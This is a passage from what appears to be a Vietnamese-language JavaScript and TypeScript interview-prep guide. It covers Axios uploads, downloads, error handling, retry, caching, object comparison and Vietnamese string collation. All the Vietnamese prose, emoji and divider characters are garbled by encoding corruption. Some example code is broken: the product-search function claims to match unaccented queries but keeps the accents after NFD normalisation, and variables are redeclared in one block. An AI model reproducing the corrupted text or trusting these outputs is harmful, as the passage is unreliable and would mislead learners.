      onUploadProgress: (progressEvent) => {
        const percentCompleted = Math.round(
          (progressEvent.loaded * 100) / progressEvent.total!
        );
        console.log(`Upload progress: ${percentCompleted}%`);
        // Update UI progress bar
      },
    });
    
    return data;
  } catch (error) {
    console.error('Upload failed:', error);
    throw error;
  }
};

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// UPLOAD MULTIPLE FILES
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const uploadMultipleFiles = async (files: File[]) => {
  const formData = new FormData();
  
  files.forEach((file, index) => {
    formData.append(`file${index}`, file);
  });
  
  const { data } = await axios.post('/api/upload-multiple', formData, {
    headers: {
      'Content-Type': 'multipart/form-data',
    },
    onUploadProgress: (progressEvent) => {
      const percentCompleted = Math.round(
        (progressEvent.loaded * 100) / progressEvent.total!
      );
      console.log(`Total upload progress: ${percentCompleted}%`);
    },
  });
  
  return data;
};

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// REACT COMPONENT - File Upload vá»›i Progress Bar
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function FileUploader() {
  const [uploadProgress, setUploadProgress] = useState(0);
  const [uploading, setUploading] = useState(false);
  
  const handleFileUpload = async (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0];
    if (!file) return;
    
    const formData = new FormData();
    formData.append('file', file);
    
    setUploading(true);
    
    try {
      await axios.post('/api/upload', formData, {
        onUploadProgress: (progressEvent) => {
          const progress = Math.round(
            (progressEvent.loaded * 100) / progressEvent.total!
          );
          setUploadProgress(progress);
        },
      });
      
      alert('Upload successful!');
    } catch (error) {
      console.error('Upload failed:', error);
    } finally {
      setUploading(false);
      setUploadProgress(0);
    }
  };
  
  return (
    <div>
      <input type="file" onChange={handleFileUpload} disabled={uploading} />
      {uploading && (
        <div className="progress-bar">
          <div style={{ width: `${uploadProgress}%` }}>
            {uploadProgress}%
          </div>
        </div>
      )}
    </div>
  );
}
```

#### **4.2. File Download**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// DOWNLOAD FILE
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const downloadFile = async (fileId: string) => {
  try {
    const response = await axios.get(`/api/files/${fileId}`, {
      responseType: 'blob', // âœ… Important cho files
      onDownloadProgress: (progressEvent) => {
        const percentCompleted = Math.round(
          (progressEvent.loaded * 100) / progressEvent.total!
        );
        console.log(`Download progress: ${percentCompleted}%`);
      },
    });
    
    // Create blob URL vÃ  trigger download
    const url = window.URL.createObjectURL(new Blob([response.data]));
    const link = document.createElement('a');
    link.href = url;
    link.setAttribute('download', 'filename.pdf'); // Filename
    document.body.appendChild(link);
    link.click();
    link.remove();
    window.URL.revokeObjectURL(url);
  } catch (error) {
    console.error('Download failed:', error);
  }
};

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// DOWNLOAD DIFFERENT FILE TYPES
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const downloadPDF = async () => {
  const response = await axios.get('/api/report.pdf', {
    responseType: 'blob',
  });
  
  const blob = new Blob([response.data], { type: 'application/pdf' });
  const url = window.URL.createObjectURL(blob);
  window.open(url); // Open in new tab
};

const downloadExcel = async () => {
  const response = await axios.get('/api/export.xlsx', {
    responseType: 'arraybuffer', // For Excel files
  });
  
  const blob = new Blob([response.data], {
    type: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  });
  
  const url = window.URL.createObjectURL(blob);
  const link = document.createElement('a');
  link.href = url;
  link.download = 'export.xlsx';
  link.click();
};
```

---

### **5. Error Handling - Xá»­ LÃ½ Lá»—i Chi Tiáº¿t**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ERROR STRUCTURE
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

try {
  const response = await axios.get('/api/users');
} catch (error) {
  if (axios.isAxiosError(error)) {
    // âœ… Type-safe error handling
    
    if (error.response) {
      // âŒ Server responded vá»›i status code ngoÃ i 2xx
      console.error('Response error:');
      console.error('Status:', error.response.status);
      console.error('Data:', error.response.data);
      console.error('Headers:', error.response.headers);
      
      // Handle specific status codes
      switch (error.response.status) {
        case 400:
          console.error('Bad Request - Invalid data');
          break;
        case 401:
          console.error('Unauthorized - Please login');
          // Redirect to login
          window.location.href = '/login';
          break;
        case 403:
          console.error('Forbidden - No permission');
          break;
        case 404:
          console.error('Not Found');
          break;
        case 422:
          console.error('Validation Error');
          // Show validation errors
          const validationErrors = error.response.data.errors;
          break;
        case 429:
          console.error('Too Many Requests - Rate limited');
          break;
        case 500:
          console.error('Server Error');
          break;
        case 503:
          console.error('Service Unavailable');
          break;
      }
      
    } else if (error.request) {
      // âŒ Request sent nhÆ°ng khÃ´ng nháº­n Ä‘Æ°á»£c response
      console.error('Request error - No response received');
      console.error('Possible causes:');
      console.error('- Network error');
      console.error('- CORS issue');
      console.error('- Request timeout');
      console.error('- Server not responding');
      
    } else {
      // âŒ Lá»—i khi setup request
      console.error('Setup error:', error.message);
    }
    
    console.error('Config:', error.config);
  } else {
    // Lá»—i khÃ¡c (khÃ´ng pháº£i Axios error)
    console.error('Unexpected error:', error);
  }
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// CUSTOM ERROR HANDLER
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

interface ApiErrorResponse {
  success: boolean;
  message: string;
  status: number | null;
  data: any;
  errors?: Record<string, string[]>; // Validation errors
}

const handleAxiosError = (error: unknown): ApiErrorResponse => {
  if (axios.isAxiosError(error)) {
    const message = error.response?.data?.message || error.message;
    const status = error.response?.status || null;
    const errors = error.response?.data?.errors;
    
    return {
      success: false,
      message,
      status,
      data: error.response?.data,
      errors,
    };
  }
  
  return {
    success: false,
    message: 'An unexpected error occurred',
    status: null,
    data: null,
  };
};

// Usage
try {
  const response = await axios.post('/api/users', userData);
  return { success: true, data: response.data, message: 'Success', status: 200 };
} catch (error) {
  return handleAxiosError(error);
}
```

---

### **6. Advanced Features**

#### **6.1. Retry Logic**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// AUTO RETRY vá»›i Exponential Backoff
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const axiosRetry = async (config: any, retries = 3, delay = 1000) => {
  for (let i = 0; i < retries; i++) {
    try {
      return await axios(config);
    } catch (error) {
      if (i === retries - 1) throw error;
      
      // Exponential backoff
      const waitTime = delay * Math.pow(2, i);
      console.log(`Retry ${i + 1}/${retries} after ${waitTime}ms...`);
      await new Promise(resolve => setTimeout(resolve, waitTime));
    }
  }
};

// Usage
const data = await axiosRetry({
  method: 'get',
  url: '/api/users',
}, 3, 1000);
```

#### **6.2. Request Deduplication**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// PREVENT DUPLICATE REQUESTS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const pendingRequests = new Map<string, Promise<any>>();

const dedupeRequest = async (config: any) => {
  const key = `${config.method}:${config.url}:${JSON.stringify(config.params)}`;
  
  // Náº¿u cÃ³ request pending
  if (pendingRequests.has(key)) {
    console.log('ğŸ”„ Reusing pending request...');
    return pendingRequests.get(key);
  }
  
  // Create new request
  const promise = axios(config).finally(() => {
    pendingRequests.delete(key);
  });
  
  pendingRequests.set(key, promise);
  return promise;
};
```

#### **6.3. Response Caching**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// SIMPLE CACHE IMPLEMENTATION
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

interface CacheEntry {
  data: any;
  timestamp: number;
}

const cache = new Map<string, CacheEntry>();

const cachedRequest = async (
  url: string,
  config = {},
  ttl = 5 * 60 * 1000 // 5 minutes
) => {
  const cacheKey = `${url}:${JSON.stringify(config)}`;
  
  // Check cache
  const cached = cache.get(cacheKey);
  if (cached && Date.now() - cached.timestamp < ttl) {
    console.log('âœ… Returning cached data');
    return cached.data;
  }
  
  // Fetch fresh data
  const response = await axios.get(url, config);
  cache.set(cacheKey, {
    data: response.data,
    timestamp: Date.now(),
  });
  
  return response.data;
};
```

---

### **ğŸ’¡ Best Practices**

```typescript
// âœ… 1. LuÃ´n dÃ¹ng axios instance thay vÃ¬ default axios
const api = axios.create({ baseURL: '/api' });

// âœ… 2. TypeScript types cho responses
interface User {
  id: string;
  name: string;
}

const getUser = async (id: string): Promise<User> => {
  const { data } = await api.get<User>(`/users/${id}`);
  return data;
};

// âœ… 3. Centralize error handling
api.interceptors.response.use(
  response => response,
  error => {
    // Handle globally
    handleAxiosError(error);
    return Promise.reject(error);
  }
);

// âœ… 4. Cancel requests on component unmount
useEffect(() => {
  const controller = new AbortController();
  // ... fetch data
  return () => controller.abort();
}, []);

// âœ… 5. Use timeout Ä‘á»ƒ avoid hung requests
axios.create({ timeout: 10000 });
```

---
</details>


## **Pháº§n 8: Object Manipulation**

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ”€ Q22: Compare Objects</span></summary>


**âš¡ Quick Summary:**
> Compare objects: JSON.stringify, lodash isEqual, hoáº·c custom recursive compare

**ğŸ’¡ Ghi Nhá»›:**
- ğŸ¯ **Shallow**: `JSON.stringify()` - fast nhÆ°ng limited
- ğŸ” **Deep**: Lodash `isEqual()` - handle circular refs
- âš ï¸ **Trap**: `{a:1} === {a:1}` = false (khÃ¡c reference)

**Tráº£ lá»i:**

- **Shallow Comparison**: So sÃ¡nh references vÃ  primitive values
- **Deep Comparison**: So sÃ¡nh táº¥t cáº£ nested properties
- **Hoáº¡t Ä‘á»™ng**: Objects Ä‘Æ°á»£c so sÃ¡nh báº±ng reference, khÃ´ng pháº£i value
- **Æ¯u Ä‘iá»ƒm**: Deep comparison chÃ­nh xÃ¡c, shallow comparison nhanh
- **NhÆ°á»£c Ä‘iá»ƒm**: Deep comparison cháº­m, shallow comparison khÃ´ng chÃ­nh xÃ¡c

**Code Example:**

```typescript
// Shallow comparison
const obj1 = { name: 'John', age: 25 };
const obj2 = { name: 'John', age: 25 };
const obj3 = obj1;

console.log(obj1 === obj2); // false (different references)
console.log(obj1 === obj3); // true (same reference)

// Deep comparison function
function deepEqual(obj1: any, obj2: any): boolean {
  if (obj1 === obj2) return true;

  if (obj1 == null || obj2 == null) return false;

  if (typeof obj1 !== typeof obj2) return false;

  if (typeof obj1 !== 'object') return obj1 === obj2;

  if (Array.isArray(obj1) !== Array.isArray(obj2)) return false;

  const keys1 = Object.keys(obj1);
  const keys2 = Object.keys(obj2);

  if (keys1.length !== keys2.length) return false;

  for (let key of keys1) {
    if (!keys2.includes(key)) return false;
    if (!deepEqual(obj1[key], obj2[key])) return false;
  }

  return true;
}

// Usage
const obj1 = { name: 'John', age: 25, address: { city: 'HCM' } };
const obj2 = { name: 'John', age: 25, address: { city: 'HCM' } };

console.log(deepEqual(obj1, obj2)); // true
```

**Best Practices:**

- Sá»­ dá»¥ng deep comparison cho object comparison
- Sá»­ dá»¥ng shallow comparison cho performance
- Sá»­ dá»¥ng libraries nhÆ° Lodash cho complex comparisons
- Sá»­ dá»¥ng TypeScript cho type safety

</details>

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ“ Q23: Compare Strings</span></summary>


**âš¡ Quick Summary:**
> Compare strings: `===`, `localeCompare()` (i18n), ignore case vá»›i toLowerCase()

**ğŸ’¡ Ghi Nhá»›:**
- ğŸ¯ **Exact**: `str1 === str2`
- ğŸŒ **Locale**: `str1.localeCompare(str2)` - dÃ¹ng cho sorting
- ğŸ”¤ **Case-insensitive**: `str1.toLowerCase() === str2.toLowerCase()`

**Tráº£ lá»i:**

- **KhÃ¡i niá»‡m**: So sÃ¡nh chuá»—i cáº§n xá»­ lÃ½ Ä‘Ãºng **Unicode, dáº¥u thanh tiáº¿ng Viá»‡t, case sensitivity, vÃ  locale** Ä‘á»ƒ cÃ³ káº¿t quáº£ chÃ­nh xÃ¡c
- **Ká»¹ thuáº­t cÆ¡ báº£n**: `===`, `==`, `<`, `>` (so sÃ¡nh theo Unicode code points - khÃ´ng phÃ¹ há»£p tiáº¿ng Viá»‡t)
- **Ká»¹ thuáº­t nÃ¢ng cao**: `localeCompare()`, `Intl.Collator` (so sÃ¡nh Ä‘Ãºng theo ngÃ´n ngá»¯, há»— trá»£ dáº¥u thanh)
- **Æ¯u Ä‘iá»ƒm**: `Intl.Collator` tá»‘t nháº¥t cho sort, search tiáº¿ng Viá»‡t; performance cao khi so sÃ¡nh nhiá»u láº§n
- **NhÆ°á»£c Ä‘iá»ƒm**: `===` khÃ´ng xá»­ lÃ½ Ä‘Æ°á»£c dáº¥u thanh, accents; cáº§n normalize() cho Unicode variants

**CÃ¡c Váº¥n Äá» Khi So SÃ¡nh Chuá»—i:**

1. **Case Sensitivity** (PhÃ¢n biá»‡t hoa/thÆ°á»ng): "Apple" â‰  "apple"
2. **Unicode Normalization** (Chuáº©n hÃ³a Unicode): "Ã©" cÃ³ thá»ƒ lÃ  1 char (`\u00e9`) hoáº·c 2 chars (`e` + `\u0301`)
3. **Diacritics/Accents** (Dáº¥u thanh): Tiáº¿ng Viá»‡t "Ã ", "Ã¡", "áº£", "Ã£", "áº¡" cáº§n xá»­ lÃ½ Ä‘Ãºng
4. **Locale-specific** (Theo ngÃ´n ngá»¯): Tiáº¿ng Viá»‡t "Ä‘" khÃ¡c "d", nhÆ°ng má»™t sá»‘ ngÃ´n ngá»¯ coi lÃ  giá»‘ng nhau
5. **Whitespace** (Khoáº£ng tráº¯ng): "  Hello  " vs "Hello"

**Code Example (TypeScript):**

```typescript
// ============================================
// 1. SO SÃNH CÆ  Báº¢N (Basic Comparison)
// ============================================

// A. Equality (So sÃ¡nh báº±ng)
const str1 = 'Hello';
const str2 = 'Hello';
const str3 = 'hello';

console.log(str1 === str2); // true - Giá»‘ng nhau hoÃ n toÃ n
console.log(str1 === str3); // false - KhÃ¡c case

// B. Case-insensitive comparison (KhÃ´ng phÃ¢n biá»‡t hoa/thÆ°á»ng)
console.log(str1.toLowerCase() === str3.toLowerCase()); // true
console.log(str1.toUpperCase() === str3.toUpperCase()); // true

// C. Lexicographic comparison (So sÃ¡nh tá»« Ä‘iá»ƒn - theo Unicode)
console.log('apple' < 'banana'); // true - 'a' (97) < 'b' (98)
console.log('Apple' < 'banana'); // true - 'A' (65) < 'b' (98)
console.log('10' < '2'); // true - âš ï¸ So sÃ¡nh string, khÃ´ng pháº£i number!

// ============================================
// 2. Váº¤N Äá»€ Vá»šI TIáº¾NG VIá»†T (Vietnamese Issues)
// ============================================

// âŒ SAI: So sÃ¡nh trá»±c tiáº¿p khÃ´ng xá»­ lÃ½ dáº¥u thanh
const vn1 = 'HÃ  Ná»™i';
const vn2 = 'Háº£i PhÃ²ng';
const vn3 = 'Huáº¿';

console.log(vn1 < vn2); // false - âš ï¸ 'Ã ' (U+00E0) > 'áº£' (U+1EA3) theo Unicode
console.log(vn2 < vn3); // false - âš ï¸ KhÃ´ng Ä‘Ãºng thá»© tá»± alphabet tiáº¿ng Viá»‡t

// âŒ SAI: Unicode variants (CÃ¹ng kÃ½ tá»± nhÆ°ng khÃ¡c Unicode)
const e1 = 'cafÃ©'; // Ã© = \u00e9 (1 character - precomposed)
const e2 = 'cafÃ©'; // Ã© = e + \u0301 (2 characters - decomposed)
console.log(e1 === e2); // false - âš ï¸ KhÃ¡c Unicode representation
console.log(e1.length); // 4
console.log(e2.length); // 5

// âœ… ÄÃšNG: Normalize trÆ°á»›c khi so sÃ¡nh
console.log(e1.normalize('NFC') === e2.normalize('NFC')); // true
console.log(e1.normalize('NFD') === e2.normalize('NFD')); // true

// ============================================
// 3. localeCompare() - SO SÃNH THEO LOCALE
// ============================================

// Syntax: str1.localeCompare(str2, locale, options)
// Return: -1 (str1 < str2), 0 (equal), 1 (str1 > str2)

const city1 = 'HÃ  Ná»™i';
const city2 = 'Háº£i PhÃ²ng';
const city3 = 'Huáº¿';

// A. So sÃ¡nh theo tiáº¿ng Viá»‡t (Ä‘Ãºng thá»© tá»± alphabet)
console.log(city1.localeCompare(city2, 'vi')); // -1 (HÃ  Ná»™i < Háº£i PhÃ²ng)
console.log(city2.localeCompare(city3, 'vi')); // -1 (Háº£i PhÃ²ng < Huáº¿)
console.log(city1.localeCompare(city1, 'vi')); // 0 (equal)

// B. Case-insensitive comparison vá»›i localeCompare
const name1 = 'Nguyá»…n VÄƒn A';
const name2 = 'NGUYá»„N VÄ‚N A';

console.log(name1.localeCompare(name2, 'vi', { sensitivity: 'base' })); // 0 (equal - khÃ´ng phÃ¢n biá»‡t hoa/thÆ°á»ng)
console.log(name1.localeCompare(name2, 'vi', { sensitivity: 'case' })); // -1 (khÃ¡c case)

// C. Ignore accents (Bá» qua dáº¥u thanh)
const word1 = 'nha';
const word2 = 'nhÃ ';

console.log(word1.localeCompare(word2, 'vi', { sensitivity: 'base' })); // 0 (coi lÃ  giá»‘ng nhau)
console.log(word1.localeCompare(word2, 'vi', { sensitivity: 'accent' })); // -1 (khÃ¡c dáº¥u)

// D. Numeric comparison (So sÃ¡nh sá»‘ trong string)
const file1 = 'file2.txt';
const file2 = 'file10.txt';

console.log(file1 < file2); // false - âš ï¸ String comparison: '2' > '1'
console.log(file1.localeCompare(file2, 'en', { numeric: true })); // -1 - âœ… 2 < 10

// ============================================
// 4. Intl.Collator - SO SÃNH HIá»†U QUáº¢ (Reusable)
// ============================================

// Khi cáº§n so sÃ¡nh nhiá»u láº§n â†’ táº¡o Collator instance (hiá»‡u quáº£ hÆ¡n)

// A. Táº¡o Collator cho tiáº¿ng Viá»‡t
const vietnameseCollator = new Intl.Collator('vi', {
  sensitivity: 'base', // KhÃ´ng phÃ¢n biá»‡t hoa/thÆ°á»ng, dáº¥u thanh
  numeric: true, // So sÃ¡nh sá»‘ Ä‘Ãºng
  ignorePunctuation: true, // Bá» qua dáº¥u cÃ¢u
});

const cities = ['HÃ  Ná»™i', 'ÄÃ  Náºµng', 'Há»“ ChÃ­ Minh', 'Cáº§n ThÆ¡', 'Huáº¿'];

// Sort theo thá»© tá»± tiáº¿ng Viá»‡t
const sortedCities = cities.sort((a, b) => vietnameseCollator.compare(a, b));
console.log(sortedCities);
// âœ… ['Cáº§n ThÆ¡', 'ÄÃ  Náºµng', 'HÃ  Ná»™i', 'Há»“ ChÃ­ Minh', 'Huáº¿']

// B. Collator vá»›i options khÃ¡c nhau
const caseSensitiveCollator = new Intl.Collator('vi', {
  sensitivity: 'case', // PhÃ¢n biá»‡t hoa/thÆ°á»ng
});

console.log(caseSensitiveCollator.compare('Viá»‡t Nam', 'viá»‡t nam')); // -1 (khÃ¡c case)

const accentSensitiveCollator = new Intl.Collator('vi', {
  sensitivity: 'accent', // PhÃ¢n biá»‡t dáº¥u thanh
});

console.log(accentSensitiveCollator.compare('nha', 'nhÃ ')); // -1 (khÃ¡c dáº¥u)

// C. Search/Filter vá»›i Collator
const names = ['Nguyá»…n VÄƒn A', 'Nguyá»…n VÄƒn B', 'Tráº§n Thá»‹ C', 'NGUYá»„N VÄ‚N A'];
const searchTerm = 'nguyá»…n vÄƒn a';

const vietnameseSearchCollator = new Intl.Collator('vi', {
  sensitivity: 'base', // KhÃ´ng phÃ¢n biá»‡t hoa/thÆ°á»ng, dáº¥u thanh
});

const results = names.filter(
  (name) => vietnameseSearchCollator.compare(name, searchTerm) === 0
);
console.log(results); // ['Nguyá»…n VÄƒn A', 'NGUYá»„N VÄ‚N A']

// ============================================
// 5. PRACTICAL EXAMPLES (VÃ­ Dá»¥ Thá»±c Táº¿)
// ============================================

// A. TÃ¬m kiáº¿m sáº£n pháº©m (khÃ´ng phÃ¢n biá»‡t dáº¥u, hoa/thÆ°á»ng)
interface Product {
  id: number;
  name: string;
}

const products: Product[] = [
  { id: 1, name: 'CÃ  phÃª ÄÃ  Láº¡t' },
  { id: 2, name: 'TrÃ  Ã” Long' },
  { id: 3, name: 'CÃ  phÃª Sá»¯a' },
  { id: 4, name: 'TrÃ  Sá»¯a TrÃ¢n ChÃ¢u' },
];

function searchProducts(query: string): Product[] {
  const normalizedQuery = query.normalize('NFD').toLowerCase();
  
  return products.filter((product) => {
    const normalizedName = product.name.normalize('NFD').toLowerCase();
    return normalizedName.includes(normalizedQuery);
  });
}

console.log(searchProducts('ca phe')); 
// âœ… [{ id: 1, name: 'CÃ  phÃª ÄÃ  Láº¡t' }, { id: 3, name: 'CÃ  phÃª Sá»¯a' }]

console.log(searchProducts('tra')); 
// âœ… [{ id: 2, name: 'TrÃ  Ã” Long' }, { id: 4, name: 'TrÃ  Sá»¯a TrÃ¢n ChÃ¢u' }]

// B. Sort danh sÃ¡ch tÃªn tiáº¿ng Viá»‡t
const students = [
  'Nguyá»…n VÄƒn A',
  'Tráº§n Thá»‹ B',
  'LÃª HoÃ ng C',
  'Äáº·ng Minh D',
  'Pháº¡m Thu E',
];

const collator = new Intl.Collator('vi');
const sortedStudents = students.sort((a, b) => collator.compare(a, b));
console.log(sortedStudents);
// âœ… ['Äáº·ng Minh D', 'LÃª HoÃ ng C', 'Nguyá»…n VÄƒn A', 'Pháº¡m Thu E', 'Tráº§n Thá»‹ B']

// C. Validate duplicate names (trÃ¡nh trÃ¹ng láº·p)
function hasDuplicateName(names: string[], newName: string): boolean {
  const collator = new Intl.Collator('vi', { sensitivity: 'base' });
  
  return names.some((name) => collator.compare(name, newName) === 0);
}

const existingNames = ['Nguyá»…n VÄƒn A', 'Tráº§n Thá»‹ B'];

console.log(hasDuplicateName(existingNames, 'NGUYá»„N VÄ‚N A')); // true - trÃ¹ng (khÃ´ng phÃ¢n biá»‡t hoa/thÆ°á»ng)
console.log(hasDuplicateName(existingNames, 'LÃª VÄƒn C')); // false - khÃ´ng trÃ¹ng

// D. Compare versions/file names vá»›i sá»‘
const versions = ['v1.2.10', 'v1.2.2', 'v1.10.0', 'v1.2.1'];

const numericCollator = new Intl.Collator('en', { numeric: true });
const sortedVersions = versions.sort((a, b) => numericCollator.compare(a, b));
console.log(sortedVersions);
// âœ… ['v1.2.1', 'v1.2.2', 'v1.2.10', 'v1.10.0'] - Ä‘Ãºng thá»© tá»± sá»‘

// ============================================
// 6. PERFORMANCE COMPARISON
// ============================================

// Benchmark: So sÃ¡nh 10,000 láº§n
const testData = Array.from({ length: 10000 }, (_, i) => `Nguyá»…n ${i}`);

// Method 1: localeCompare (cháº­m khi gá»i nhiá»u láº§n)
console.time('localeCompare');
testData.sort((a, b) => a.localeCompare(b, 'vi'));
console.timeEnd('localeCompare'); // ~50-100ms

// Method 2: Intl.Collator (nhanh hÆ¡n nhiá»u)
console.time('Intl.Collator');
const collatorBenchmark = new Intl.Collator('vi');
testData.sort((a, b) => collatorBenchmark.compare(a, b));
console.timeEnd('Intl.Collator'); // ~10-20ms - âš¡ Nhanh gáº¥p 5x

// ============================================
// 7. HELPER FUNCTIONS (HÃ m Tiá»‡n Ãch)
// ============================================

// A. Remove accents (Bá» dáº¥u tiáº¿ng Viá»‡t)
function removeAccents(str: string): string {
  return str
    .normalize('NFD') // TÃ¡ch dáº¥u ra
    .replace(/[\u0300-\u036f]/g, '') // XÃ³a dáº¥u
    .replace(/Ä‘/g, 'd')
    .replace(/Ä/g, 'D');
}

console.log(removeAccents('HÃ  Ná»™i')); // 'Ha Noi'
console.log(removeAccents('Nguyá»…n VÄƒn A')); // 'Nguyen Van A'

// B. Fuzzy search (TÃ¬m gáº§n Ä‘Ãºng)
function fuzzyMatch(str: string, query: string): boolean {
  const normalizedStr = removeAccents(str.toLowerCase());
  const normalizedQuery = removeAccents(query.toLowerCase());
  
  return normalizedStr.includes(normalizedQuery);
}

console.log(fuzzyMatch('CÃ  phÃª ÄÃ  Láº¡t', 'ca phe')); // true
console.log(fuzzyMatch('TrÃ  Sá»¯a', 'tra sua')); // true

// C. Compare with options
function compareStrings(
  str1: string,
  str2: string,
  options: {
    caseSensitive?: boolean;
    accentSensitive?: boolean;
    locale?: string;
  } = {}
): number {
  const {
    caseSensitive = false,
    accentSensitive = false,
    locale = 'vi',
  } = options;

  let sensitivity: 'base' | 'accent' | 'case' | 'variant' = 'base';
  
  if (caseSensitive && accentSensitive) {
    sensitivity = 'variant'; // PhÃ¢n biá»‡t táº¥t cáº£
  } else if (accentSensitive) {
    sensitivity = 'accent'; // Chá»‰ phÃ¢n biá»‡t dáº¥u
  } else if (caseSensitive) {
    sensitivity = 'case'; // Chá»‰ phÃ¢n biá»‡t hoa/thÆ°á»ng
  }

  return str1.localeCompare(str2, locale, { sensitivity });
}

console.log(compareStrings('HÃ  Ná»™i', 'HÃ  Ná»™i')); // 0 (equal)
console.log(compareStrings('HÃ  Ná»™i', 'HA NOI')); // 0 (khÃ´ng phÃ¢n biá»‡t case)
console.log(compareStrings('HÃ  Ná»™i', 'HA NOI', { caseSensitive: true })); // -1 (khÃ¡c case)
```

**Best Practices (Thá»±c HÃ nh Tá»‘t):**

1. **âœ… Sá»­ dá»¥ng `Intl.Collator` khi sort/compare nhiá»u láº§n** (performance tá»‘t hÆ¡n `localeCompare`)
2. **âœ… LuÃ´n `normalize()` trÆ°á»›c khi so sÃ¡nh** náº¿u cÃ³ Unicode variants
3. **âœ… Chá»n `sensitivity` phÃ¹ há»£p**:
   - `base`: KhÃ´ng phÃ¢n biá»‡t case, accent (search)
   - `accent`: PhÃ¢n biá»‡t accent, khÃ´ng phÃ¢n biá»‡t case
   - `case`: PhÃ¢n biá»‡t case, khÃ´ng phÃ¢n biá»‡t accent
   - `variant`: PhÃ¢n biá»‡t táº¥t cáº£ (strict)
4. **âœ… DÃ¹ng `numeric: true`** khi sort file names, versions
5. **âœ… Remove accents cho fuzzy search** (tÃ¬m kiáº¿m gáº§n Ä‘Ãºng)

**Common Mistakes (Lá»—i ThÆ°á»ng Gáº·p):**

```typescript
// âŒ Lá»–I 1: So sÃ¡nh trá»±c tiáº¿p tiáº¿ng Viá»‡t
const bad1 = 'HÃ  Ná»™i' < 'Huáº¿'; // âŒ Sai thá»© tá»±

// âœ… ÄÃšNG: DÃ¹ng localeCompare
const good1 = 'HÃ  Ná»™i'.localeCompare('Huáº¿', 'vi') < 0; // âœ… true

// âŒ Lá»–I 2: KhÃ´ng normalize Unicode
const bad2 = 'cafÃ©' === 'cafÃ©'; // âŒ CÃ³ thá»ƒ false náº¿u khÃ¡c Unicode

// âœ… ÄÃšNG: Normalize trÆ°á»›c
const good2 = 'cafÃ©'.normalize('NFC') === 'cafÃ©'.normalize('NFC'); // âœ… true

// âŒ Lá»–I 3: DÃ¹ng toLowerCase() cho tiáº¿ng Viá»‡t
